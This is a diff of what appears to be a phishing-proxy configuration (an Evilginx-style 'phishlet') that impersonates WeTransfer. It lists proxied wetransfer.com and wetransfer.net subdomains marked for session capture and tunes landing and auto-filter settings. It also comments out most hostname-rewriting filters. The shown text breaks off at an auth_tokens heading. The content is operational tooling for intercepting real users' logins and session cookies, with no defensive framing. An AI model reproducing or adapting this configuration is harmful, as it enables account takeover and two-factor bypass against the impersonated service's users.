@@ -2,30 +2,30 @@ author: '@XC'
 min_ver: '2.3.0'
 
 proxy_hosts:
-  - {phish_sub: '', orig_sub: '', domain: 'wetransfer.com', session: true, is_landing: false}
-  - {phish_sub: 'www', orig_sub: 'www', domain: 'wetransfer.com', session: true, is_landing: true, auto_filter: false}
-  - {phish_sub: 'auth', orig_sub: 'auth', domain: 'wetransfer.com', session: true, is_landing: false, auto_filter: false}
-  - {phish_sub: 'portals', orig_sub: 'portals', domain: 'wetransfer.com', session: true, is_landing: false, auto_filter: false}
-  - {phish_sub: 'wepresents', orig_sub: 'wepresents', domain: 'wetransfer.com', session: true, is_landing: false, auto_filter: false}
-  - {phish_sub: 'prod-cdn', orig_sub: 'prod-cdn', domain: 'wetransfer.net', session: true, is_landing: false, auto_filter: false}
-  - {phish_sub: 'backgrounds', orig_sub: 'backgrounds', domain: 'wetransfer.net', session: true, is_landing: false, auto_filter: false}
-  - {phish_sub: 'auth-cdn', orig_sub: 'auth-cdn', domain: 'wetransfer.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: '', orig_sub: '', domain: 'wetransfer.com', session: true, is_landing: true}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'wetransfer.com', session: true, is_landing: true, auto_filter: true}
+  - {phish_sub: 'auth', orig_sub: 'auth', domain: 'wetransfer.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'portals', orig_sub: 'portals', domain: 'wetransfer.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'wepresents', orig_sub: 'wepresents', domain: 'wetransfer.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'prod-cdn', orig_sub: 'prod-cdn', domain: 'wetransfer.net', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'backgrounds', orig_sub: 'backgrounds', domain: 'wetransfer.net', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'auth-cdn', orig_sub: 'auth-cdn', domain: 'wetransfer.com', session: true, is_landing: false, auto_filter: true}
 
 sub_filters:
   - {triggers_on: 'www.wetransfer.com', orig_sub: 'www', domain: 'wetransfer.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
-  - {triggers_on: 'www.wetransfer.com', orig_sub: 'www', domain: 'wetransfer.com', search: 'https://{hostname_regexp}', replace: 'https://{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
-  - {triggers_on: 'www.wetransfer.com', orig_sub: 'auth', domain: 'wetransfer.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
-  - {triggers_on: 'www.wetransfer.com', orig_sub: 'auth', domain: 'wetransfer.com', search: 'https://{hostname_regexp}', replace: 'https://{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
-  - {triggers_on: 'www.wetransfer.com', orig_sub: 'portals', domain: 'wetransfer.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
-  - {triggers_on: 'www.wetransfer.com', orig_sub: 'portals', domain: 'wetransfer.com', search: 'https://{hostname_regexp}', replace: 'https://{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
-  - {triggers_on: 'www.wetransfer.com', orig_sub: 'wepresents', domain: 'wetransfer.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
-  - {triggers_on: 'www.wetransfer.com', orig_sub: 'wepresents', domain: 'wetransfer.com', search: 'https://{hostname_regexp}', replace: 'https://{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
-  - {triggers_on: 'www.wetransfer.com', orig_sub: 'prod-cdn', domain: 'wetransfer.net', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
-  - {triggers_on: 'www.wetransfer.com', orig_sub: 'prod-cdn', domain: 'wetransfer.net', search: 'https://{hostname_regexp}', replace: 'https://{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
-  - {triggers_on: 'www.wetransfer.com', orig_sub: 'backgrounds', domain: 'wetransfer.net', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
-  - {triggers_on: 'www.wetransfer.com', orig_sub: 'backgrounds', domain: 'wetransfer.net', search: 'https://{hostname_regexp}', replace: 'https://{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
-  - {triggers_on: 'auth.wetransfer.com', orig_sub: 'auth-cdn', domain: 'wetransfer.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
-  - {triggers_on: 'auth.wetransfer.com', orig_sub: 'auth-cdn', domain: 'wetransfer.com', search: 'https://{hostname_regexp}', replace: 'https://{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  #- {triggers_on: 'www.wetransfer.com', orig_sub: 'www', domain: 'wetransfer.com', search: 'https://{hostname_regexp}', replace: 'https://{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  #- {triggers_on: 'www.wetransfer.com', orig_sub: 'auth', domain: 'wetransfer.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  #- {triggers_on: 'www.wetransfer.com', orig_sub: 'auth', domain: 'wetransfer.com', search: 'https://{hostname_regexp}', replace: 'https://{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  #- {triggers_on: 'www.wetransfer.com', orig_sub: 'portals', domain: 'wetransfer.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  #- {triggers_on: 'www.wetransfer.com', orig_sub: 'portals', domain: 'wetransfer.com', search: 'https://{hostname_regexp}', replace: 'https://{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  #- {triggers_on: 'www.wetransfer.com', orig_sub: 'wepresents', domain: 'wetransfer.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  #- {triggers_on: 'www.wetransfer.com', orig_sub: 'wepresents', domain: 'wetransfer.com', search: 'https://{hostname_regexp}', replace: 'https://{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  #- {triggers_on: 'www.wetransfer.com', orig_sub: 'prod-cdn', domain: 'wetransfer.net', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  #- {triggers_on: 'www.wetransfer.com', orig_sub: 'prod-cdn', domain: 'wetransfer.net', search: 'https://{hostname_regexp}', replace: 'https://{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  #- {triggers_on: 'www.wetransfer.com', orig_sub: 'backgrounds', domain: 'wetransfer.net', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  #- {triggers_on: 'www.wetransfer.com', orig_sub: 'backgrounds', domain: 'wetransfer.net', search: 'https://{hostname_regexp}', replace: 'https://{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  #- {triggers_on: 'auth.wetransfer.com', orig_sub: 'auth-cdn', domain: 'wetransfer.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  #- {triggers_on: 'auth.wetransfer.com', orig_sub: 'auth-cdn', domain: 'wetransfer.com', search: 'https://{hostname_regexp}', replace: 'https://{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
 
   
 auth_tokens:
